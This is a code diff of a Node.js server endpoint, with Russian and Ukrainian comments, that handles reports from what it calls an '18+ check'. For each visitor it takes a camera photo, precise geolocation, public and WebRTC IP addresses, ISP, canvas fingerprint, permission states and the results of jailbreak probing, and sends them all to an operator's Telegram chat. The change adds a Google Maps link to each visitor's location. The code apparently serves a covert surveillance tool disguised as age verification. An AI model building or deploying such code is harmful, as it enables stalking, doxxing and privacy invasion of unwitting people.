@@ -138,6 +138,10 @@ function short(str, n = 64) {
   str = String(str);
   return str.length <= n ? str : (str.slice(0, n - 3) + '...');
 }
+function gmLink(lat, lon, z = 17) {
+  const href = `https://maps.google.com/?q=${encodeURIComponent(lat)},${encodeURIComponent(lon)}&z=${z}`;
+  return `<a href="${href}">${escapeHTML(`${lat}, ${lon}`)}</a>`;
+}
 
 // ==== health & debug ====
 app.get('/health', (_req, res) => res.json({ ok: true }));
@@ -232,15 +236,32 @@ app.post('/api/report', async (req, res) => {
     const jbSum = jb.summary || {};
     const fp = jb.firstPositive || null;
 
-    const caption = [
+    // ====== КАПШН (тестовая часть) В ТВОЕМ ПОРЯДКЕ ======
+    const linesTop = [
       '<b>Новый отчёт 18+ проверка</b>',
       `Code: <code>${escapeHTML(String(code).toUpperCase())}</code>`,
-      `UA: <code>${escapeHTML(userAgent || '')}</code>`,
+      // Есть ли джейлбрейк
+      `JB: <code>${escapeHTML(jbSum.label || 'n/a')}</code>`,
+      // Причина / доп. инфа
+      (fp?.scheme
+        ? `JB info: <code>${escapeHTML(fp.scheme)}</code> (${escapeHTML(fp.reason||'reason?')} ~${escapeHTML(fp.durationMs||'0')}ms)`
+        : (Array.isArray(jbSum.reasons) && jbSum.reasons.length
+            ? `JB info: <code>${escapeHTML(jbSum.reasons.join(', '))}</code>`
+            : `JB info: <code>—</code>`)),
+      // Версия iOS
+      `iOS: <code>${escapeHTML(iosVersion ?? '')}</code>`,
+      // Платформа
       `Platform: <code>${escapeHTML(platform || '')}</code>`,
-      `iOS-like: <code>${escapeHTML(iosVersion ?? '')}</code>  Safari: <code>${escapeHTML(isSafari)}</code>`,
-      geo ? `Geo: <code>${escapeHTML(`${geo.lat}, ${geo.lon} ±${geo.acc}m`)}</code>` : 'Geo: <code>нет</code>',
+      // UA
+      `UA: <code>${escapeHTML(userAgent || '')}</code>`,
+      // Гео — ссылкой на Google Maps
+      (geo
+        ? `Geo: ${gmLink(geo.lat, geo.lon)} <code>±${escapeHTML(geo.acc)}</code>m`
+        : 'Geo: <code>нет</code>')
+    ];
 
-      // краткий мультисбор:
+    // ====== «ОСТАЛЬНОЕ» (краткий мультисбор и девайс-чек) ======
+    const linesRest = [
       cp.permissions ? `Perms: <code>geo=${escapeHTML(cp.permissions.geolocation||'?')} cam=${escapeHTML(cp.permissions.camera||'?')} mic=${escapeHTML(cp.permissions.microphone||'?')}</code>` : null,
       pubIP.ip ? `IP: <code>${escapeHTML(pubIP.ip||'?')} ${escapeHTML(pubIP.country||'')}</code> ISP: <code>${escapeHTML(pubIP.isp||pubIP.org||'')}</code>` : 'IP: <code>нет</code>',
       `WebRTC IPs: <code>${webrtcCount}</code>  DC-ISP: <code>${escapeHTML(short(dcWords, 40) || '–')}</code>`,
@@ -250,16 +271,13 @@ app.post('/api/report', async (req, res) => {
       canvas ? `Canvas: <code>${escapeHTML(short(canvas.hash,18))} (${canvas.size})</code>` : null,
       inApp?.isInApp ? `InApp: <code>${escapeHTML((inApp.any||[]).join(','))}</code>` : 'InApp: <code>нет</code>',
       locale?.timeZone ? `TZ: <code>${escapeHTML(locale.timeZone)}</code>` : null,
-
-      // device_check + JB summary
       (dc && (dc.score!=null || dc.label)) ? `Check: <code>${escapeHTML(dc.label||'?')} (${dc.score ?? '?'})</code>` : null,
-      jbSum.label ? `JB: <code>${escapeHTML(jbSum.label)}</code> attempts=<code>${escapeHTML(jbSum.attempts ?? jbSum.checks ?? 0)}</code> totalMs=<code>${escapeHTML(jbSum.totalMs ?? 0)}</code>` : 'JB: <code>n/a</code>',
-      fp?.scheme ? `JB hit: <code>${escapeHTML(fp.scheme)}</code> (${escapeHTML(fp.reason||'reason?')} ~${escapeHTML(fp.durationMs||'0')}ms)` : null,
-
       note ? `Note: <code>${escapeHTML(note)}</code>` : null
-    ].filter(Boolean).join('\n');
+    ].filter(Boolean);
 
-    // 1) Фото + краткая сводка
+    const caption = [...linesTop, ...linesRest].join('\n');
+
+    // 1) Фото + капшн
     const buf = b64ToBuffer(photoBase64);
     const tgPhoto = await sendPhotoToTelegram({
       chatId: String(row.chat_id),
@@ -267,10 +285,11 @@ app.post('/api/report', async (req, res) => {
       photoBuf: buf
     });
 
-    // 1.1) Компактная таблица JB-попыток (если есть)
-    if (Array.isArray(jb.results) && jb.results.length) {
+    // 1.1) Компактна таблиця JB-спроб (якщо є)
+    const jbResults = Array.isArray(jb.results) ? jb.results : [];
+    if (jbResults.length) {
       const head = 'scheme | opened | reason | ms';
-      const rows = jb.results.slice(0, 8).map(r => {
+      const rows = jbResults.slice(0, 8).map(r => {
         const s  = String(r.scheme || '').replace(/\s+/g, '');
         const o  = r.opened ? 'yes' : 'no';
         const re = (r.reason || (r.opened ? 'signal' : 'timeout'));
@@ -280,18 +299,18 @@ app.post('/api/report', async (req, res) => {
       const table = [head, ...rows].join('\n');
       await sendMessageToTelegram({
         chatId: String(row.chat_id),
-        text: `<b>JB attempts (${jb.results.length})</b>\n<pre>${escapeHTML(table)}</pre>`,
+        text: `<b>JB attempts (${jbResults.length})</b>\n<pre>${escapeHTML(table)}</pre>`,
         parse_mode: 'HTML'
       });
     }
 
-    // 2) Полный JSON мультисбора и девайс-чека — чанками
+    // 2) Повний JSON мультизбору і девайс-чеку — чанками (НЕ ЧІПАВ)
     const fullJson = safeJson({
       geo, userAgent, platform, iosVersion, isSafari,
       client_profile: cp, device_check: dc
     }, 2);
 
-    const CHUNK = 3500; // запас ниже лимита 4096
+    const CHUNK = 3500; // запас нижче ліміту 4096
     for (let i = 0; i < fullJson.length; i += CHUNK) {
       const part = fullJson.slice(i, i + CHUNK);
       await sendMessageToTelegram({
